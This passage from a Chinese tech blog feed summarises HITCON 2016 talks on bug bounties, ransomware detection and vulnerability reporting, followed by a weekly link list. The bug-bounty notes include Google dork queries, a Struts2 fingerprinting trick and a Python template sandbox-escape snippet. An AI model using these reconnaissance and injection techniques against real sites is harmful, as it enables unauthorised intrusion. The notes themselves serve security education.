&lt;li&gt;天下武功唯快不破  &lt;ul&gt;
&lt;li&gt;指紋辨識，收集整理  &lt;ul&gt;
&lt;li&gt;Web Applicaion?  &lt;/li&gt;
&lt;li&gt;Framework?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平時做好筆記，1-Day 出來搶首殺  &lt;ul&gt;
&lt;li&gt;WordPress CVE-2016-4567  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例  &lt;ul&gt;
&lt;li&gt;Uber Reflected XSS  &lt;ul&gt;
&lt;li&gt;馬上透過了 Google Hacking 找了一個 XSS 回報，但因為速度太慢被 Reject  &lt;/li&gt;
&lt;li&gt;中國網友跟我說：「所有服務到了中國，安全係數要乘以 0.8。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;developer.apple.com&lt;/code&gt; 被駭案例  &lt;ul&gt;
&lt;li&gt;2013/07/18 Internet 最黑暗的一天，struts2 漏洞(s2-016)公佈。  &lt;/li&gt;
&lt;li&gt;當天有四組人馬進入，為什麼我知道？因為我是其中一個  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Yahoo Login Site RCE  &lt;ul&gt;
&lt;li&gt;依然是用 Google Hacking  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:yahoo.com. ext:action&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;b.login.yahoo.com&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;看起來 s2-016 work 但看起來有 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繞過 WAF  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;認命做苦工活  &lt;ul&gt;
&lt;li&gt;可以從一些小細節來判斷要不要對這個網站下手  &lt;/li&gt;
&lt;li&gt;用 Google Hacking 黑 Google =&amp;gt; www.google.com XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;site:www.google.com -adwords -finance...&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;www.google.com/trends/correlate/js/correlate.js&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;網站的 footer 停留在 2011，表示可能已經沒在維護  &lt;/li&gt;
&lt;li&gt;JavaScript 有 Minify 但沒有做 Obfuscation  &lt;/li&gt;
&lt;li&gt;別忘了他在 JavaScript  &lt;ul&gt;
&lt;li&gt;HTML Entity  &lt;/li&gt;
&lt;li&gt;八進位  &lt;/li&gt;
&lt;li&gt;十六進位  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看起來是個 Dom-Based 的 SELF-XSS 需使用者互動  &lt;ul&gt;
&lt;li&gt;收的機率一半一半，需要找到更合理的情境說服 Google  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;繼續往下挖掘  &lt;ul&gt;
&lt;li&gt;跟 Click Hijacking 做組合技  &lt;/li&gt;
&lt;li&gt;iframe 會跟著使用者的滑鼠移動，所以使用者點擊網站上任何地方都會觸發該漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後拿了 5000 美金  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Facebook Remote Code Execution  &lt;ul&gt;
&lt;li&gt;反向 facebook.com 的 Whois 結果  &lt;/li&gt;
&lt;li&gt;透過 SQL Injection 拿 Shell  &lt;/li&gt;
&lt;li&gt;拿 Root  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;平行權限與邏輯問題  &lt;ul&gt;
&lt;li&gt;平行權限：例如任意發文、任意改錢、權限問題  &lt;/li&gt;
&lt;li&gt;邏輯問題：想像自己是撰寫目標程式碼的工程師的話，自己會怎麼寫。  &lt;ul&gt;
&lt;li&gt;案例：Apple XSS  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;lookup-api.apple.com/wikipedia.org&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;少見姿勢與神思路  &lt;ul&gt;
&lt;li&gt;針對架構的瞭解  &lt;/li&gt;
&lt;li&gt;非主流的漏洞，愈少人知道的東西愈有搞頭  &lt;/li&gt;
&lt;li&gt;思路的培養  &lt;ul&gt;
&lt;li&gt;CTF  &lt;/li&gt;
&lt;li&gt;其他 Bug Bounty 的 write-up  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;案例：Apple RCE，第一次進入 Apple 內網  &lt;ul&gt;
&lt;li&gt;Struts2 漏洞在 2012 年根本沒啥人知道  &lt;/li&gt;
&lt;li&gt;Google Trend of Struts2  &lt;ul&gt;
&lt;li&gt;兩次高峰都是有 RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;發現的經典模式  &lt;ul&gt;
&lt;li&gt;「你尋找你知道的東西（比如到印度的新方法），結果發現了一個你不知道的東西（例如美洲）。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;某大廠商 XSS 0-Day 發現經過  &lt;ul&gt;
&lt;li&gt;掃 Tesla 範圍時發現一個 IP  &lt;/li&gt;
&lt;li&gt;進去發現是某大廠商的系統  &lt;/li&gt;
&lt;li&gt;思路  &lt;ul&gt;
&lt;li&gt;Struts2 撰寫 action 都需繼承 ActionSupport  &lt;/li&gt;
&lt;li&gt;因此要判斷一個網站是不是 Struts2，只要在網址最後加上 &lt;code&gt;?actionErrors=1&lt;/code&gt; 即可  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如果被過濾的話怎麼辦  &lt;ul&gt;
&lt;li&gt;AngularJS  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Uber SSTI RCE  &lt;ul&gt;
&lt;li&gt;Template 相關攻擊手法是近幾年比較夯的東西，但較少人關注。  &lt;/li&gt;
&lt;li&gt;Uber 在自身技術部落格有提到產品技術細節  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;riders.uber.com&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;修改姓名等到寄信通知帳號變更  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Python Sandbox Bypass  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{ []._class__.__base__.__subclasses__() }}&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結語  &lt;ul&gt;
&lt;li&gt;一起成為獎金獵人吧！  &lt;/li&gt;
&lt;li&gt;勿驕矜自滿，勿忘初衷。  &lt;/li&gt;
&lt;li&gt;可以自己把 know-how 做成工具  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;FèlDo: Function Event Listing and Dynamic Observing: for Detecting and Preventing Crypto Ransomware&lt;/h2&gt;
&lt;h3&gt;Speaker: Tzung-Bi Shih&lt;/h3&gt;
&lt;p&gt;Slides: &lt;a href="http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware"&gt;http://www.slideshare.net/penvirus/feldo-function-event-listing-and-dynamic-observing-for-detecting-and-preventing-crypto-ransomware&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ransomware 的本質  &lt;ul&gt;
&lt;li&gt;DoS 受害者  &lt;/li&gt;
&lt;li&gt;限制軟體的使用，並以此向受害者要求付款。  &lt;/li&gt;
&lt;li&gt;最困難的是交易的部份，還必須把錢洗成白的。  &lt;/li&gt;
&lt;li&gt;沒有人能保證付了錢以後，勒索者就會把東西還給你。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ransomware 的誤解  &lt;ul&gt;
&lt;li&gt;我們會誤解成「利用加密手段而像你要求贖金」的軟體  &lt;/li&gt;
&lt;li&gt;但以下幾個也是 Ransomware  &lt;ul&gt;
&lt;li&gt;misleading application  &lt;ul&gt;
&lt;li&gt;誤導你做出錯誤的舉動，然後再以幫你解決這問題為由跟你要贖金。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;police ransomware  &lt;ul&gt;
&lt;li&gt;假裝是當地的執法單位跟你要錢說可以規避一些法律上的問題。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;History of Ransomware on OS X  &lt;ul&gt;
&lt;li&gt;July 2013, FBI ransomware  &lt;ul&gt;
&lt;li&gt;潛伏在 Safari 裏面，搜尋完後會跳出視窗，告訴你說你散佈著作權作品或散播兒童色情，必須要付贖金才可以解決。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;June 2014, FileCoder  &lt;/li&gt;
&lt;li&gt;Sep 2015, Gopher  &lt;/li&gt;
&lt;li&gt;Nov 2015, Mabouia  &lt;/li&gt;
&lt;li&gt;Feb 2016, Ginx  &lt;/li&gt;
&lt;li&gt;Mar 2016, KeRanger (今天這個 talk 的重點）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OSX.KeRanger  &lt;ul&gt;
&lt;li&gt;研究這個 ransomware 的行為  &lt;/li&gt;
&lt;li&gt;然後嘗試去 rescue 被它 encrypt 的檔案  &lt;/li&gt;
&lt;li&gt;撰寫 kernel module 使用動態分析的方式去 detect 其行為  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Related Work  &lt;ul&gt;
&lt;li&gt;Toward Generic (Crypto) Ransomware Detection  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;有沒有辦法做靜態分析？  &lt;ul&gt;
&lt;li&gt;有可能，但難度比較高，比如說用 Symbolic Execution 的方式，所以我認為還是用動態分析比較簡單。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;台灣駭客協會年度規劃及專案報告 HITCON Annual Keynote&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://kb.hitcon.org"&gt;https://kb.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;資安技術文章分享平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://zeroday.hitcon.org"&gt;https://zeroday.hitcon.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;漏洞通報平台  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON 2016 奇葩獎&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;奇葩人氣獎  &lt;ul&gt;
&lt;li&gt;國安局招考駭客，單手握力竟要 30 公斤。  &lt;ul&gt;
&lt;li&gt;三立新聞 2015/10/15  &lt;/li&gt;
&lt;li&gt;少林科技武僧選拔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;中勒索軟體是否會付款？民眾：「還是拿去報廢好了，因為現在電腦也才一萬多塊而已。」  &lt;ul&gt;
&lt;li&gt;刺激台灣 PC 業最佳模範  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;東森購物網抽獎被抓包！網友攤開程式碼，發現大獎根本抽不到」  &lt;ul&gt;
&lt;li&gt;不是你的，就不是你的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERP Server 被勒索軟體加密，所以當機。  &lt;ul&gt;
&lt;li&gt;離職前夕送給同事的大禮  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;新政府將打造高階的臺灣資安神盾局  &lt;ul&gt;
&lt;li&gt;我是奇葩隊長，我終於找到工作了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;梁振英追蹤多位台灣美女，港特首辦：駭客入侵加的  &lt;ul&gt;
&lt;li&gt;自由時報 2015-12-30  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;網曝華碩主機板 BIOS 和 UEFI 更新機制隱患大，易被劫持。  &lt;ul&gt;
&lt;li&gt;因為交涉了一年多都沒有結果，只好把細節公佈出來。  &lt;/li&gt;
&lt;li&gt;交涉過程中各種理由推托：窗口離職、下班了、颱風假  &lt;/li&gt;
&lt;li&gt;「放假，對企業來說是十分嚴肅的。」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;羅瑩雪：「他們又不方政府做， 他們是在政府的對面啊！」  &lt;ul&gt;
&lt;li&gt;在對面總比在下面好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;民進黨網站遭駭，重要會議，手機全包塑膠袋。  &lt;ul&gt;
&lt;li&gt;如果有手汗的困擾，可以選購防水型手機。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩特別獎  &lt;ul&gt;
&lt;li&gt;MD5 惡意程式  &lt;/li&gt;
&lt;li&gt;四程式隔空盜領  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ping 8.8.8.8 -t&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;奇葩年度研究員（正經）  &lt;ul&gt;
&lt;li&gt;Orange Tsai  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;HITCON Workshop: &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay 漏洞通報平台&lt;/a&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;通報漏洞的測試請點到為止就好，不要攻擊或是深入去拿不該拿的東西。  &lt;/li&gt;
&lt;li&gt;很多都沒有通報窗口  &lt;ul&gt;
&lt;li&gt;whois  &lt;ul&gt;
&lt;li&gt;登記的人最好更正到正確的資訊，否則通報的內容會直接給 whois 上登記的人。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;從網頁內容找  &lt;/li&gt;
&lt;li&gt;就是找不到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;我們還會被反通報  &lt;ul&gt;
&lt;li&gt;被大學計中通報到 TACERT 說是詐騙信  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;滿分的單位  &lt;ul&gt;
&lt;li&gt;部份台灣的私立大學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最爛的單位  &lt;ul&gt;
&lt;li&gt;某國立大學、排名前五、在北部、有資安實驗室、還有 HITCON CTF 的成員。通報從頭到尾都沒修，還騙 TACERT 已經修了，脆後乾脆就不理他們了。（這間怎麼聽起來這麼明顯XDDD）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;比較常見的嚴重狀況  &lt;ul&gt;
&lt;li&gt;SQL Injection  &lt;/li&gt;
&lt;li&gt;Struts2  &lt;/li&gt;
&lt;li&gt;Jenkins RCE 漏洞  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;今年因為公司出門票而且不用請假就可以在星期五、六參加，&lt;br /&gt;
所以拉了三位同事一起來，畢竟開發公司的程式還是要有些資安意識比較好，&lt;br /&gt;
畢竟知道了 Hackers 到底可以做哪些事情後，寫程式應該也會比較注意一些。&lt;br /&gt;
有兩位同事是第一次參加，所以大概跟他們稍微介紹了一下資安相關的常識。  &lt;/p&gt;
&lt;p&gt;算一算，從 HITCON 2012 第一次參加開始，今年也算是第五年參加了，&lt;br /&gt;
這次感覺不少非工作人員的熟面孔都沒出現，新面孔倒是多了不少，而且感覺有年輕化的趨勢。&lt;br /&gt;
對我這種只把資安當興趣、打過兩次金盾決賽只拿到一次第五名、打 CTF 也沒有太大貢獻的傢伙來說，&lt;br /&gt;
真的已經有種自己跟不上時代的感覺了。  &lt;/p&gt;
&lt;p&gt;個人覺得今年講的比較好的場次是 GD 的 Gogoro 那場，&lt;br /&gt;
還有第二天 Orange 有關 Bug Bounty 的 Keynote（聽完真的會讓我想嘗試看 Bug Bounty）。&lt;br /&gt;
對我來說，現在參加 HITCON 已經有點變成是看這些能力很強的人怎麼努力，然後順便給自己充電的感覺，&lt;br /&gt;
出社會工作以後真的覺得沒有個目標在的話，很容易迷失在庸庸碌碌中。  &lt;/p&gt;
&lt;p&gt;個人覺得今年議程的種類算是蠻平均的，算是各個種類都有一些，&lt;br /&gt;
Ransomware 因為最近一堆 Crypto Ransomware 很猖獗，所以有蠻多場次都與其相關，&lt;br /&gt;
Android 的場次也不少，反觀 iOS 的好像就沒那麼多，然後 Web 好像又更少了。&lt;br /&gt;
這兩年偏新手向的場次也比較多，&lt;br /&gt;
想起第一次來參加 HITCON 的時候，&lt;br /&gt;
我根本每個議程都聽不懂，&lt;br /&gt;
現在的新會眾就比較幸福一些。  &lt;/p&gt;
&lt;p&gt;然後 &lt;a href="https://kb.hitcon.org"&gt;KnowledgeBase&lt;/a&gt; 跟 &lt;a href="https://zeroday.hitcon.org"&gt;ZeroDay&lt;/a&gt;，&lt;br /&gt;
也是這兩年左右才開始弄的東西，&lt;br /&gt;
希望可以把台灣的資安發展帶往更好的方向。  &lt;/p&gt;
&lt;p&gt;明年還會不會想參加我自己也不確定，&lt;br /&gt;
出來工作以後其實也沒有說比學生還累，&lt;br /&gt;
但不知道為啥就是已經沒那麼熱血了，&lt;br /&gt;
去年還有玩一下 IoT Wargame 跟 RPi 和攤位的一些活動，&lt;br /&gt;
今年不知為何慵懶到連玩都不太想玩，&lt;br /&gt;
然後 BambooFox 打的一些 CTF 也沒啥心情想參加，&lt;br /&gt;
也許明年還要不要參加就明年到時候再決定吧。  &lt;/p&gt;</summary><category term="HITCON"></category></entry><entry><title>Y2016W28</title><link href="https://blog.m157q.tw/posts/2016/07/17/y2016w28/" rel="alternate"></link><published>2016-07-17T23:48:03+08:00</published><updated>2016-07-17T23:48:03+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-07-17:posts/2016/07/17/y2016w28/</id><summary type="html">&lt;h3&gt;Android&lt;/h3&gt;
&lt;p&gt;昨天把手上的 ZenFone 2 (ZE551ML) 刷成 CM，第一次刷機，收集了一些資料。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.cyanogenmod.org/w/Doc:_fastboot_intro"&gt;Doc: fastboot intro - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rovo89/Xposed"&gt;GitHub - rovo89/Xposed: The native part of the Xposed framework (mainly the modified app_process binary).&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/android#Automatic_installation"&gt;Android - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.cyanogenmod.org/w/Doc:_adb_intro"&gt;Doc: adb intro - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.cyanogenmod.org/w/Install_CM_for_Z00A"&gt;How to Install CyanogenMod on the Asus Zenfone 2 (1080p) ("Z00A") - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://wiki.cyanogenmod.org/w/UDEV"&gt;UDEV - CyanogenMod&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ansible&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://docs.ansible.com/ansible/playbooks_best_practices.html"&gt;Best Practices — Ansible Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有空好像應該來看一下，半年前學了 ansible 之後一直沒用到，可能最近找看看工作上有沒有地方可以用到吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ansible/ansible-examples"&gt;GitHub - ansible/ansible-examples: A few starter examples of ansible playbooks, to show features and how they work together.  See http://galaxy.ansible.com for example roles from the Ansible community for deploying many popular applications.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cloudflare&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.allenchou.cc/cloudflare-user-feel/"&gt;CloudFlare使用心得 | 電腦故我在&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/"&gt;Secure and fast GitHub Pages with CloudFlare&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇大概跟我一個月前買 domain name 後用免費版的 CloudFlare 服務弄這個 blog 差不多，只是他用 Jekyll 我用 Pelican，最近應該會來寫篇文章紀錄一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Facebook&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://free.com.tw/getherhim/"&gt;Her/Him 最簡單的交友程式！在 Facebook 上隨機找人匿名聊天&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;蠻有趣的 Facebook Messenger Bot 實作方式，試用了一下，真的有在上面交換到帳號並加好友，不過一開始真的不知道要聊什麼，因為根本沒有對方的資訊，只能自己問。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GAE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/10829731/ingesting-logs-into-bigquery-from-a-python-script"&gt;google app engine - Ingesting logs into bigquery from a python script - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來似乎只能先存到 Cloud Storage 再透過 MapReduce 存到 BigQuery，想找看看有沒有 Real-time 的方式，不知道透過 Pub/Sub 可不可行？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/refdocs/google.appengine.api.logservice.logservice"&gt;google.appengine.api.logservice.logservice module  |  Python  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看 GAE 的 Request log 有紀錄了哪些 fields 可以拿來用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;GitHub&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/dylandy/tobopomo.js"&gt;GitHub - dylandy/tobopomo.js: A simple and easy plugin for convert string to Bopomo script and Chinese Characters.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;打注音但忘記切換輸入法，導致打出來是英數字的時候可以用 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/chrislgarry/Apollo-11"&gt;GitHub - chrislgarry/Apollo-11: Original Apollo 11 Guidance Computer (AGC) source code for the command and lunar modules.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;阿波羅十一號用的導航系統的原始碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Go&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/cadvisor"&gt;GitHub - google/cadvisor: Analyzes resource usage and performance characteristics of running containers.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Hitcon&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://hitcon.org/2016/CMT/#hitcon_agenda"&gt;台灣駭客年會 HITCON CMT 2016&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://imgur.com/a/f0kYP"&gt;[HITCON 2016 的奇葩獎就決定是你了！](http://www.ettoday.net/news/20160713/734459.htm#ixzz4EIJOGwej) - Album on Imgur&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ettoday.net/news/20160713/734459.htm#ixzz4EIJOGwej"&gt;植入一銀ATM3支病毒1指令檔　用來指揮吐鈔和刪除程式 | ETtoday社會新聞 | ETtoday 新聞雲&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;『而 3 支惡意程式都屬「MD5」的格式，所以 ，呼籲有同型 ATM 的銀行業者；要儘快檢查是否有被植入 MD5 的惡意程式。』 笑翻 XDDDDDDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;K8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.kubernetes.io/2016/07/five-days-of-kubernetes-1.3.html"&gt;Kubernetes: Five Days of Kubernetes 1.3&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.kubernetes.io/2016/07/dashboard-web-interface-for-kubernetes.html"&gt;Kubernetes: Dashboard - Full Featured Web Interface for Kubernetes&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/kubernetes/dashboard"&gt;GitHub - kubernetes/dashboard: General-purpose web UI for Kubernetes clusters&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://lkml.iu.edu/hypermail/linux/kernel/1607.1/00627.html"&gt;Linux-Kernel Archive: Re: [patch] crypto: sha256-mb - cleanup a || vs | typo&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;感覺 Linus 也需要為 Linux kernel source code 弄個像 flake8 這種 syntax checker 了，沒跑過 syntax check 就不准 merge！（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Luigi&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://luigi.readthedocs.io/en/stable/index.html"&gt;Getting Started — Luigi 2.2.0 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;公司有用到 Luigi，最近正在看相關的部份，所以瞭解一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Markdown&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://yhatt.github.io/marp/"&gt;Marp - Markdown Presentation Writer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;哦哦！用 Markdown 寫 slides 的即時預覽編輯器，支援 Linux, Mac, Windows，好像不錯耶。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yhatt/marp"&gt;GitHub - yhatt/marp: Markdown presentation writer, powered by Electron.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;第一銀行的 ATM 被植入惡意程式，被兩個俄羅斯人拿走八千萬新台幣的相關。  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://orson.tw/2016/07/12/%e6%8a%80%e8%a1%93%e5%88%86%e6%9e%90-%e5%a6%82%e4%bd%95%e9%81%99%e6%8e%a7atm%e5%90%90%e9%8c%a2/"&gt;技術分析 – 如何遙控ATM吐錢 – 綠紅黃白黑&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://orson.tw/2016/07/12/%e9%8d%b5%e7%9b%a4%e6%9f%af%e5%8d%97-%e4%b8%80%e9%8a%80atm%e7%9b%9c%e9%a0%98%e4%ba%8b%e4%bb%b6/"&gt;鍵盤柯南 – 一銀ATM盜領事件 – 綠紅黃白黑&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.techbang.com/posts/44747-millet-electric-mosquito"&gt;小米電蚊香現身！售價約台幣 150 元還可隨身使用 | T客邦 - 我只推薦好東西&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Opensource&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.othree.net/log/2016/07/16/hkoscon-2016/"&gt;HKOSCON 2016 : O3noBLOG&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「就是大概進入 COSCUP 開始辦之後，參與發展在地化的自由開源軟體的人卻越來越少」  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ptt&lt;/h3&gt;
&lt;ul&gt;
